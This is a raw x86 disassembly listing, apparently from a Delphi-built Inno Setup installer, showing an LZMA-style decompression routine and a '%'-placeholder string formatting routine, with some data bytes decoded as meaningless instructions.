  4087d6:	8b d9                	mov    %ecx,%ebx
  4087d8:	8b c7                	mov    %edi,%eax
  4087da:	2b c6                	sub    %esi,%eax
  4087dc:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  4087df:	72 03                	jb     0x4087e4
  4087e1:	03 45 bc             	add    -0x44(%ebp),%eax
  4087e4:	8b 55 c0             	mov    -0x40(%ebp),%edx
  4087e7:	8a 04 02             	mov    (%edx,%eax,1),%al
  4087ea:	88 45 eb             	mov    %al,-0x15(%ebp)
  4087ed:	8b 55 c0             	mov    -0x40(%ebp),%edx
  4087f0:	8a 4d eb             	mov    -0x15(%ebp),%cl
  4087f3:	88 0c 3a             	mov    %cl,(%edx,%edi,1)
  4087f6:	47                   	inc    %edi
  4087f7:	3b 7d bc             	cmp    -0x44(%ebp),%edi
  4087fa:	75 02                	jne    0x4087fe
  4087fc:	33 ff                	xor    %edi,%edi
  4087fe:	8b 45 98             	mov    -0x68(%ebp),%eax
  408801:	8a 55 eb             	mov    -0x15(%ebp),%dl
  408804:	88 10                	mov    %dl,(%eax)
  408806:	ff 45 ec             	incl   -0x14(%ebp)
  408809:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  40880c:	3b 4d bc             	cmp    -0x44(%ebp),%ecx
  40880f:	0f 83 13 fe ff ff    	jae    0x408628
  408815:	ff 45 c4             	incl   -0x3c(%ebp)
  408818:	e9 0b fe ff ff       	jmp    0x408628
  40881d:	eb 54                	jmp    0x408873
  40881f:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  408825:	8b c3                	mov    %ebx,%eax
  408827:	03 c0                	add    %eax,%eax
  408829:	03 45 f0             	add    -0x10(%ebp),%eax
  40882c:	05 b0 01 00 00       	add    $0x1b0,%eax
  408831:	e8 2e f9 ff ff       	call   0x408164
  408836:	85 c0                	test   %eax,%eax
  408838:	75 05                	jne    0x40883f
  40883a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40883d:	eb 2f                	jmp    0x40886e
  40883f:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  408845:	8b c3                	mov    %ebx,%eax
  408847:	03 c0                	add    %eax,%eax
  408849:	03 45 f0             	add    -0x10(%ebp),%eax
  40884c:	05 c8 01 00 00       	add    $0x1c8,%eax
  408851:	e8 0e f9 ff ff       	call   0x408164
  408856:	85 c0                	test   %eax,%eax
  408858:	75 05                	jne    0x40885f
  40885a:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40885d:	eb 09                	jmp    0x408868
  40885f:	8b 45 d0             	mov    -0x30(%ebp),%eax
  408862:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  408865:	89 55 d0             	mov    %edx,-0x30(%ebp)
  408868:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40886b:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  40886e:	89 75 d8             	mov    %esi,-0x28(%ebp)
  408871:	8b f0                	mov    %eax,%esi
  408873:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  408879:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40887c:	05 68 0a 00 00       	add    $0xa68,%eax
  408881:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  408884:	e8 8b fa ff ff       	call   0x408314
  408889:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40888c:	83 fb 07             	cmp    $0x7,%ebx
  40888f:	7d 07                	jge    0x408898
  408891:	b8 08 00 00 00       	mov    $0x8,%eax
  408896:	eb 05                	jmp    0x40889d
  408898:	b8 0b 00 00 00       	mov    $0xb,%eax
  40889d:	8b d8                	mov    %eax,%ebx
  40889f:	e9 f7 00 00 00       	jmp    0x40899b
  4088a4:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  4088a7:	89 55 d0             	mov    %edx,-0x30(%ebp)
  4088aa:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4088ad:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  4088b0:	89 75 d8             	mov    %esi,-0x28(%ebp)
  4088b3:	83 fb 07             	cmp    $0x7,%ebx
  4088b6:	7d 07                	jge    0x4088bf
  4088b8:	b8 07 00 00 00       	mov    $0x7,%eax
  4088bd:	eb 05                	jmp    0x4088c4
  4088bf:	b8 0a 00 00 00       	mov    $0xa,%eax
  4088c4:	8b d8                	mov    %eax,%ebx
  4088c6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4088c9:	05 64 06 00 00       	add    $0x664,%eax
  4088ce:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  4088d4:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  4088d7:	e8 38 fa ff ff       	call   0x408314
  4088dc:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4088df:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  4088e5:	83 7d cc 04          	cmpl   $0x4,-0x34(%ebp)
  4088e9:	7d 05                	jge    0x4088f0
  4088eb:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4088ee:	eb 05                	jmp    0x4088f5
  4088f0:	b8 03 00 00 00       	mov    $0x3,%eax
  4088f5:	c1 e0 06             	shl    $0x6,%eax
  4088f8:	ba 06 00 00 00       	mov    $0x6,%edx
  4088fd:	03 c0                	add    %eax,%eax
  4088ff:	03 45 f0             	add    -0x10(%ebp),%eax
  408902:	05 60 03 00 00       	add    $0x360,%eax
  408907:	e8 e0 f8 ff ff       	call   0x4081ec
  40890c:	89 45 a0             	mov    %eax,-0x60(%ebp)
  40890f:	83 7d a0 04          	cmpl   $0x4,-0x60(%ebp)
  408913:	7c 77                	jl     0x40898c
  408915:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  408918:	d1 f9                	sar    $1,%ecx
  40891a:	49                   	dec    %ecx
  40891b:	89 4d 9c             	mov    %ecx,-0x64(%ebp)
  40891e:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  408921:	8b 75 a0             	mov    -0x60(%ebp),%esi
  408924:	83 e6 01             	and    $0x1,%esi
  408927:	83 ce 02             	or     $0x2,%esi
  40892a:	d3 e6                	shl    %cl,%esi
  40892c:	83 7d a0 0e          	cmpl   $0xe,-0x60(%ebp)
  408930:	7d 28                	jge    0x40895a
  408932:	8b c6                	mov    %esi,%eax
  408934:	8b 55 a0             	mov    -0x60(%ebp),%edx
  408937:	03 c0                	add    %eax,%eax
  408939:	03 d2                	add    %edx,%edx
  40893b:	03 45 f0             	add    -0x10(%ebp),%eax
  40893e:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  408944:	05 60 05 00 00       	add    $0x560,%eax
  408949:	2b c2                	sub    %edx,%eax
  40894b:	8b 55 9c             	mov    -0x64(%ebp),%edx
  40894e:	83 c0 fe             	add    $0xfffffffe,%eax
  408951:	e8 da f8 ff ff       	call   0x408230
  408956:	03 f0                	add    %eax,%esi
  408958:	eb 35                	jmp    0x40898f
  40895a:	8b 55 9c             	mov    -0x64(%ebp),%edx
  40895d:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  408963:	83 c2 fc             	add    $0xfffffffc,%edx
  408966:	e8 99 f7 ff ff       	call   0x408104
  40896b:	c1 e0 04             	shl    $0x4,%eax
  40896e:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  408974:	03 f0                	add    %eax,%esi
  408976:	8b 45 f0             	mov    -0x10(%ebp),%eax
  408979:	05 44 06 00 00       	add    $0x644,%eax
  40897e:	ba 04 00 00 00       	mov    $0x4,%edx
  408983:	e8 a8 f8 ff ff       	call   0x408230
  408988:	03 f0                	add    %eax,%esi
  40898a:	eb 03                	jmp    0x40898f
  40898c:	8b 75 a0             	mov    -0x60(%ebp),%esi
  40898f:	46                   	inc    %esi
  408990:	75 09                	jne    0x40899b
  408992:	c7 45 cc ff ff ff ff 	movl   $0xffffffff,-0x34(%ebp)
  408999:	eb 7d                	jmp    0x408a18
  40899b:	83 45 cc 02          	addl   $0x2,-0x34(%ebp)
  40899f:	3b 75 c4             	cmp    -0x3c(%ebp),%esi
  4089a2:	76 0a                	jbe    0x4089ae
  4089a4:	b8 01 00 00 00       	mov    $0x1,%eax
  4089a9:	e9 ef 00 00 00       	jmp    0x408a9d
  4089ae:	8b 55 bc             	mov    -0x44(%ebp),%edx
  4089b1:	2b 55 c4             	sub    -0x3c(%ebp),%edx
  4089b4:	3b 55 cc             	cmp    -0x34(%ebp),%edx
  4089b7:	76 08                	jbe    0x4089c1
  4089b9:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  4089bc:	01 4d c4             	add    %ecx,-0x3c(%ebp)
  4089bf:	eb 06                	jmp    0x4089c7
  4089c1:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4089c4:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4089c7:	8b c7                	mov    %edi,%eax
  4089c9:	2b c6                	sub    %esi,%eax
  4089cb:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  4089ce:	72 03                	jb     0x4089d3
  4089d0:	03 45 bc             	add    -0x44(%ebp),%eax
  4089d3:	8b 55 c0             	mov    -0x40(%ebp),%edx
  4089d6:	8a 0c 02             	mov    (%edx,%eax,1),%cl
  4089d9:	88 4d eb             	mov    %cl,-0x15(%ebp)
  4089dc:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4089df:	8a 55 eb             	mov    -0x15(%ebp),%dl
  4089e2:	88 14 38             	mov    %dl,(%eax,%edi,1)
  4089e5:	47                   	inc    %edi
  4089e6:	3b 7d bc             	cmp    -0x44(%ebp),%edi
  4089e9:	75 02                	jne    0x4089ed
  4089eb:	33 ff                	xor    %edi,%edi
  4089ed:	ff 4d cc             	decl   -0x34(%ebp)
  4089f0:	8b 45 98             	mov    -0x68(%ebp),%eax
  4089f3:	8a 55 eb             	mov    -0x15(%ebp),%dl
  4089f6:	88 10                	mov    %dl,(%eax)
  4089f8:	ff 45 ec             	incl   -0x14(%ebp)
  4089fb:	ff 45 98             	incl   -0x68(%ebp)
  4089fe:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  408a02:	74 08                	je     0x408a0c
  408a04:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408a07:	3b 4d 0c             	cmp    0xc(%ebp),%ecx
  408a0a:	72 bb                	jb     0x4089c7
  408a0c:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408a0f:	3b 45 0c             	cmp    0xc(%ebp),%eax
  408a12:	0f 82 28 fc ff ff    	jb     0x408640
  408a18:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408a1b:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  408a1e:	89 4a 20             	mov    %ecx,0x20(%edx)
  408a21:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408a24:	8b 55 88             	mov    -0x78(%ebp),%edx
  408a27:	89 50 24             	mov    %edx,0x24(%eax)
  408a2a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408a2d:	89 79 28             	mov    %edi,0x28(%ecx)
  408a30:	8b 45 c8             	mov    -0x38(%ebp),%eax
  408a33:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408a36:	03 45 ec             	add    -0x14(%ebp),%eax
  408a39:	89 42 2c             	mov    %eax,0x2c(%edx)
  408a3c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408a3f:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  408a42:	89 41 30             	mov    %eax,0x30(%ecx)
  408a45:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408a48:	89 72 34             	mov    %esi,0x34(%edx)
  408a4b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408a4e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  408a51:	89 41 38             	mov    %eax,0x38(%ecx)
  408a54:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408a57:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  408a5a:	89 4a 3c             	mov    %ecx,0x3c(%edx)
  408a5d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408a60:	8b 55 d0             	mov    -0x30(%ebp),%edx
  408a63:	89 50 40             	mov    %edx,0x40(%eax)
  408a66:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408a69:	89 59 44             	mov    %ebx,0x44(%ecx)
  408a6c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408a6f:	8b 55 cc             	mov    -0x34(%ebp),%edx
  408a72:	89 50 48             	mov    %edx,0x48(%eax)
  408a75:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408a78:	8a 45 b8             	mov    -0x48(%ebp),%al
  408a7b:	88 41 4c             	mov    %al,0x4c(%ecx)
  408a7e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408a81:	8b 8d 7c ff ff ff    	mov    -0x84(%ebp),%ecx
  408a87:	89 4a 14             	mov    %ecx,0x14(%edx)
  408a8a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408a8d:	8b 55 80             	mov    -0x80(%ebp),%edx
  408a90:	89 50 18             	mov    %edx,0x18(%eax)
  408a93:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408a96:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408a99:	89 01                	mov    %eax,(%ecx)
  408a9b:	33 c0                	xor    %eax,%eax
  408a9d:	5f                   	pop    %edi
  408a9e:	5e                   	pop    %esi
  408a9f:	5b                   	pop    %ebx
  408aa0:	8b e5                	mov    %ebp,%esp
  408aa2:	5d                   	pop    %ebp
  408aa3:	c2 08 00             	ret    $0x8
  408aa6:	90                   	nop
  408aa7:	90                   	nop
  408aa8:	55                   	push   %ebp
  408aa9:	8b ec                	mov    %esp,%ebp
  408aab:	51                   	push   %ecx
  408aac:	53                   	push   %ebx
  408aad:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  408ab0:	8b d8                	mov    %eax,%ebx
  408ab2:	83 fa 50             	cmp    $0x50,%edx
  408ab5:	74 07                	je     0x408abe
  408ab7:	b8 01 00 00 00       	mov    $0x1,%eax
  408abc:	eb 32                	jmp    0x408af0
  408abe:	8b 4d 10             	mov    0x10(%ebp),%ecx
  408ac1:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408ac4:	8b c3                	mov    %ebx,%eax
  408ac6:	e8 c1 f8 ff ff       	call   0x40838c
  408acb:	85 c0                	test   %eax,%eax
  408acd:	75 21                	jne    0x408af0
  408acf:	8b 0b                	mov    (%ebx),%ecx
  408ad1:	ba 00 03 00 00       	mov    $0x300,%edx
  408ad6:	03 4b 04             	add    0x4(%ebx),%ecx
  408ad9:	d3 e2                	shl    %cl,%edx
  408adb:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  408ade:	81 c2 36 07 00 00    	add    $0x736,%edx
  408ae4:	03 d2                	add    %edx,%edx
  408ae6:	89 11                	mov    %edx,(%ecx)
  408ae8:	8b 55 08             	mov    0x8(%ebp),%edx
  408aeb:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  408aee:	89 0a                	mov    %ecx,(%edx)
  408af0:	5b                   	pop    %ebx
  408af1:	59                   	pop    %ecx
  408af2:	5d                   	pop    %ebp
  408af3:	c2 0c 00             	ret    $0xc
  408af6:	90                   	nop
  408af7:	90                   	nop
  408af8:	89 50 10             	mov    %edx,0x10(%eax)
  408afb:	89 48 1c             	mov    %ecx,0x1c(%eax)
  408afe:	c7 40 48 fe ff ff ff 	movl   $0xfffffffe,0x48(%eax)
  408b05:	c3                   	ret
  408b06:	8b c0                	mov    %eax,%eax
  408b08:	55                   	push   %ebp
  408b09:	8b ec                	mov    %esp,%ebp
  408b0b:	83 c4 ec             	add    $0xffffffec,%esp
  408b0e:	53                   	push   %ebx
  408b0f:	56                   	push   %esi
  408b10:	57                   	push   %edi
  408b11:	33 db                	xor    %ebx,%ebx
  408b13:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  408b16:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  408b19:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  408b1c:	89 55 fc             	mov    %edx,-0x4(%ebp)
  408b1f:	8b f8                	mov    %eax,%edi
  408b21:	33 c0                	xor    %eax,%eax
  408b23:	55                   	push   %ebp
  408b24:	68 ff 8b 40 00       	push   $0x408bff
  408b29:	64 ff 30             	push   %fs:(%eax)
  408b2c:	64 89 20             	mov    %esp,%fs:(%eax)
  408b2f:	8b 75 fc             	mov    -0x4(%ebp),%esi
  408b32:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  408b35:	85 db                	test   %ebx,%ebx
  408b37:	7e 49                	jle    0x408b82
  408b39:	8d 55 f4             	lea    -0xc(%ebp),%edx
  408b3c:	b9 04 00 00 00       	mov    $0x4,%ecx
  408b41:	8b c7                	mov    %edi,%eax
  408b43:	e8 70 f1 ff ff       	call   0x407cb8
  408b48:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408b4b:	85 d2                	test   %edx,%edx
  408b4d:	c1 fa 00             	sar    $0x0,%edx
  408b50:	8d 45 f0             	lea    -0x10(%ebp),%eax
  408b53:	e8 98 a9 ff ff       	call   0x4034f0
  408b58:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  408b5c:	74 14                	je     0x408b72
  408b5e:	8d 45 f0             	lea    -0x10(%ebp),%eax
  408b61:	e8 ba a8 ff ff       	call   0x403420
  408b66:	8b d0                	mov    %eax,%edx
  408b68:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  408b6b:	8b c7                	mov    %edi,%eax
  408b6d:	e8 46 f1 ff ff       	call   0x407cb8
  408b72:	8b c6                	mov    %esi,%eax
  408b74:	8b 55 f0             	mov    -0x10(%ebp),%edx
  408b77:	e8 6c a6 ff ff       	call   0x4031e8
  408b7c:	83 c6 04             	add    $0x4,%esi
  408b7f:	4b                   	dec    %ebx
  408b80:	75 b7                	jne    0x408b39
  408b82:	8b 5d 08             	mov    0x8(%ebp),%ebx
  408b85:	85 db                	test   %ebx,%ebx
  408b87:	7e 44                	jle    0x408bcd
  408b89:	8d 55 f4             	lea    -0xc(%ebp),%edx
  408b8c:	b9 04 00 00 00       	mov    $0x4,%ecx
  408b91:	8b c7                	mov    %edi,%eax
  408b93:	e8 20 f1 ff ff       	call   0x407cb8
  408b98:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408b9b:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408b9e:	e8 4d a9 ff ff       	call   0x4034f0
  408ba3:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  408ba7:	74 14                	je     0x408bbd
  408ba9:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408bac:	e8 6f a8 ff ff       	call   0x403420
  408bb1:	8b d0                	mov    %eax,%edx
  408bb3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  408bb6:	8b c7                	mov    %edi,%eax
  408bb8:	e8 fb f0 ff ff       	call   0x407cb8
  408bbd:	8b c6                	mov    %esi,%eax
  408bbf:	8b 55 ec             	mov    -0x14(%ebp),%edx
  408bc2:	e8 21 a6 ff ff       	call   0x4031e8
  408bc7:	83 c6 04             	add    $0x4,%esi
  408bca:	4b                   	dec    %ebx
  408bcb:	75 bc                	jne    0x408b89
  408bcd:	8b 45 0c             	mov    0xc(%ebp),%eax
  408bd0:	03 45 08             	add    0x8(%ebp),%eax
  408bd3:	c1 e0 02             	shl    $0x2,%eax
  408bd6:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  408bd9:	2b c8                	sub    %eax,%ecx
  408bdb:	8b d6                	mov    %esi,%edx
  408bdd:	8b c7                	mov    %edi,%eax
  408bdf:	e8 d4 f0 ff ff       	call   0x407cb8
  408be4:	33 c0                	xor    %eax,%eax
  408be6:	5a                   	pop    %edx
  408be7:	59                   	pop    %ecx
  408be8:	59                   	pop    %ecx
  408be9:	64 89 10             	mov    %edx,%fs:(%eax)
  408bec:	68 06 8c 40 00       	push   $0x408c06
  408bf1:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408bf4:	ba 02 00 00 00       	mov    $0x2,%edx
  408bf9:	e8 ba a5 ff ff       	call   0x4031b8
  408bfe:	c3                   	ret
  408bff:	e9 f8 a1 ff ff       	jmp    0x402dfc
  408c04:	eb eb                	jmp    0x408bf1
  408c06:	5f                   	pop    %edi
  408c07:	5e                   	pop    %esi
  408c08:	5b                   	pop    %ebx
  408c09:	8b e5                	mov    %ebp,%esp
  408c0b:	5d                   	pop    %ebp
  408c0c:	c2 08 00             	ret    $0x8
  408c0f:	90                   	nop
  408c10:	0e                   	push   %cs
  408c11:	13 54 53 65          	adc    0x65(%ebx,%edx,2),%edx
  408c15:	74 75                	je     0x408c8c
  408c17:	70 4c                	jo     0x408c65
  408c19:	61                   	popa
  408c1a:	6e                   	outsb  %ds:(%esi),(%dx)
  408c1b:	67 75 61             	addr16 jne 0x408c7f
  408c1e:	67 65 45             	addr16 gs inc %ebp
  408c21:	6e                   	outsb  %ds:(%esi),(%dx)
  408c22:	74 72                	je     0x408c96
  408c24:	79 41                	jns    0x408c67
  408c26:	00 00                	add    %al,(%eax)
  408c28:	00 0a                	add    %cl,(%edx)
  408c2a:	00 00                	add    %al,(%eax)
  408c2c:	00 00                	add    %al,(%eax)
  408c2e:	10 40 00             	adc    %al,0x0(%eax)
  408c31:	00 00                	add    %al,(%eax)
  408c33:	00 00                	add    %al,(%eax)
  408c35:	00 10                	add    %dl,(%eax)
  408c37:	40                   	inc    %eax
  408c38:	00 04 00             	add    %al,(%eax,%eax,1)
  408c3b:	00 00                	add    %al,(%eax)
  408c3d:	00 10                	add    %dl,(%eax)
  408c3f:	40                   	inc    %eax
  408c40:	00 08                	add    %cl,(%eax)
  408c42:	00 00                	add    %al,(%eax)
  408c44:	00 00                	add    %al,(%eax)
  408c46:	10 40 00             	adc    %al,0x0(%eax)
  408c49:	0c 00                	or     $0x0,%al
  408c4b:	00 00                	add    %al,(%eax)
  408c4d:	00 10                	add    %dl,(%eax)
  408c4f:	40                   	inc    %eax
  408c50:	00 10                	add    %dl,(%eax)
  408c52:	00 00                	add    %al,(%eax)
  408c54:	00 00                	add    %al,(%eax)
  408c56:	10 40 00             	adc    %al,0x0(%eax)
  408c59:	14 00                	adc    $0x0,%al
  408c5b:	00 00                	add    %al,(%eax)
  408c5d:	00 10                	add    %dl,(%eax)
  408c5f:	40                   	inc    %eax
  408c60:	00 18                	add    %bl,(%eax)
  408c62:	00 00                	add    %al,(%eax)
  408c64:	00 00                	add    %al,(%eax)
  408c66:	10 40 00             	adc    %al,0x0(%eax)
  408c69:	1c 00                	sbb    $0x0,%al
  408c6b:	00 00                	add    %al,(%eax)
  408c6d:	00 10                	add    %dl,(%eax)
  408c6f:	40                   	inc    %eax
  408c70:	00 20                	add    %ah,(%eax)
  408c72:	00 00                	add    %al,(%eax)
  408c74:	00 00                	add    %al,(%eax)
  408c76:	10 40 00             	adc    %al,0x0(%eax)
  408c79:	24 00                	and    $0x0,%al
  408c7b:	00 00                	add    %al,(%eax)
  408c7d:	8d 40 00             	lea    0x0(%eax),%eax
  408c80:	55                   	push   %ebp
  408c81:	8b ec                	mov    %esp,%ebp
  408c83:	83 c4 f0             	add    $0xfffffff0,%esp
  408c86:	53                   	push   %ebx
  408c87:	56                   	push   %esi
  408c88:	57                   	push   %edi
  408c89:	33 db                	xor    %ebx,%ebx
  408c8b:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  408c8e:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  408c91:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  408c94:	89 55 fc             	mov    %edx,-0x4(%ebp)
  408c97:	8b f0                	mov    %eax,%esi
  408c99:	8b 7d 08             	mov    0x8(%ebp),%edi
  408c9c:	33 c0                	xor    %eax,%eax
  408c9e:	55                   	push   %ebp
  408c9f:	68 6a 8d 40 00       	push   $0x408d6a
  408ca4:	64 ff 30             	push   %fs:(%eax)
  408ca7:	64 89 20             	mov    %esp,%fs:(%eax)
  408caa:	8b c7                	mov    %edi,%eax
  408cac:	e8 e7 a4 ff ff       	call   0x403198
  408cb1:	85 f6                	test   %esi,%esi
  408cb3:	0f 84 96 00 00 00    	je     0x408d4f
  408cb9:	b2 25                	mov    $0x25,%dl
  408cbb:	8b c6                	mov    %esi,%eax
  408cbd:	e8 ca c0 ff ff       	call   0x404d8c
  408cc2:	8b d8                	mov    %eax,%ebx
  408cc4:	85 db                	test   %ebx,%ebx
  408cc6:	75 16                	jne    0x408cde
  408cc8:	8d 45 f0             	lea    -0x10(%ebp),%eax
  408ccb:	8b d6                	mov    %esi,%edx
  408ccd:	e8 f2 a5 ff ff       	call   0x4032c4
  408cd2:	8b 55 f0             	mov    -0x10(%ebp),%edx
  408cd5:	8b c7                	mov    %edi,%eax
  408cd7:	e8 20 a6 ff ff       	call   0x4032fc
  408cdc:	eb 71                	jmp    0x408d4f
  408cde:	3b f3                	cmp    %ebx,%esi
  408ce0:	74 1a                	je     0x408cfc
  408ce2:	8b cb                	mov    %ebx,%ecx
  408ce4:	2b ce                	sub    %esi,%ecx
  408ce6:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408ce9:	8b d6                	mov    %esi,%edx
  408ceb:	e8 88 a5 ff ff       	call   0x403278
  408cf0:	8b c7                	mov    %edi,%eax
  408cf2:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408cf5:	e8 02 a6 ff ff       	call   0x4032fc
  408cfa:	8b f3                	mov    %ebx,%esi
  408cfc:	43                   	inc    %ebx
  408cfd:	ba 7c 8d 40 00       	mov    $0x408d7c,%edx
  408d02:	8a 03                	mov    (%ebx),%al
  408d04:	e8 c7 e5 ff ff       	call   0x4072d0
  408d09:	84 c0                	test   %al,%al
  408d0b:	74 26                	je     0x408d33
  408d0d:	33 c0                	xor    %eax,%eax
  408d0f:	8a 03                	mov    (%ebx),%al
  408d11:	83 e8 31             	sub    $0x31,%eax
  408d14:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  408d17:	7f 1a                	jg     0x408d33
  408d19:	8b c7                	mov    %edi,%eax
  408d1b:	33 d2                	xor    %edx,%edx
  408d1d:	8a 13                	mov    (%ebx),%dl
  408d1f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408d22:	8b 94 91 3c ff ff ff 	mov    -0xc4(%ecx,%edx,4),%edx
  408d29:	e8 ce a5 ff ff       	call   0x4032fc
  408d2e:	83 c6 02             	add    $0x2,%esi
  408d31:	eb 86                	jmp    0x408cb9
  408d33:	8b c7                	mov    %edi,%eax
  408d35:	ba a4 8d 40 00       	mov    $0x408da4,%edx
  408d3a:	e8 bd a5 ff ff       	call   0x4032fc
  408d3f:	46                   	inc    %esi
  408d40:	80 3b 25             	cmpb   $0x25,(%ebx)
  408d43:	0f 85 70 ff ff ff    	jne    0x408cb9
  408d49:	46                   	inc    %esi
  408d4a:	e9 6a ff ff ff       	jmp    0x408cb9
  408d4f:	33 c0                	xor    %eax,%eax
  408d51:	5a                   	pop    %edx
  408d52:	59                   	pop    %ecx
  408d53:	59                   	pop    %ecx
  408d54:	64 89 10             	mov    %edx,%fs:(%eax)
  408d57:	68 71 8d 40 00       	push   $0x408d71
  408d5c:	8d 45 f0             	lea    -0x10(%ebp),%eax
  408d5f:	ba 02 00 00 00       	mov    $0x2,%edx
  408d64:	e8 4f a4 ff ff       	call   0x4031b8
  408d69:	c3                   	ret
  408d6a:	e9 8d a0 ff ff       	jmp    0x402dfc
  408d6f:	eb eb                	jmp    0x408d5c
  408d71:	5f                   	pop    %edi
  408d72:	5e                   	pop    %esi
  408d73:	5b                   	pop    %ebx
  408d74:	8b e5                	mov    %ebp,%esp
  408d76:	5d                   	pop    %ebp
  408d77:	c2 04 00             	ret    $0x4
	...
  408d82:	fe 03                	incb   (%ebx)
	...
  408d9c:	ff                   	(bad)
  408d9d:	ff                   	(bad)
  408d9e:	ff                   	(bad)
  408d9f:	ff 01                	incl   (%ecx)
  408da1:	00 00                	add    %al,(%eax)
  408da3:	00 25 00 00 00 55    	add    %ah,0x55000000
  408da9:	8b ec                	mov    %esp,%ebp
  408dab:	53                   	push   %ebx
  408dac:	56                   	push   %esi
  408dad:	57                   	push   %edi
  408dae:	8b f9                	mov    %ecx,%edi
  408db0:	8b f2                	mov    %edx,%esi
  408db2:	8b d8                	mov    %eax,%ebx
  408db4:	8b 45 08             	mov    0x8(%ebp),%eax
  408db7:	50                   	push   %eax
  408db8:	33 c0                	xor    %eax,%eax
  408dba:	8a c3                	mov    %bl,%al
  408dbc:	8b 04 85 5c c9 40 00 	mov    0x40c95c(,%eax,4),%eax
  408dc3:	e8 4c a6 ff ff       	call   0x403414
  408dc8:	8b d6                	mov    %esi,%edx
  408dca:	8b cf                	mov    %edi,%ecx
  408dcc:	e8 af fe ff ff       	call   0x408c80
  408dd1:	5f                   	pop    %edi
  408dd2:	5e                   	pop    %esi
  408dd3:	5b                   	pop    %ebx
  408dd4:	5d                   	pop    %ebp
  408dd5:	c2 04 00             	ret    $0x4
  408dd8:	53                   	push   %ebx
  408dd9:	56                   	push   %esi
  408dda:	57                   	push   %edi
  408ddb:	51                   	push   %ecx
  408ddc:	8b f9                	mov    %ecx,%edi
  408dde:	8b f2                	mov    %edx,%esi
  408de0:	8b d8                	mov    %eax,%ebx
  408de2:	57                   	push   %edi
  408de3:	89 74 24 04          	mov    %esi,0x4(%esp)
  408de7:	8d 54 24 04          	lea    0x4(%esp),%edx
  408deb:	33 c9                	xor    %ecx,%ecx
  408ded:	8b c3                	mov    %ebx,%eax
  408def:	e8 b4 ff ff ff       	call   0x408da8
  408df4:	5a                   	pop    %edx
  408df5:	5f                   	pop    %edi
  408df6:	5e                   	pop    %esi
  408df7:	5b                   	pop    %ebx
  408df8:	c3                   	ret
  408df9:	8d 40 00             	lea    0x0(%eax),%eax
  408dfc:	53                   	push   %ebx
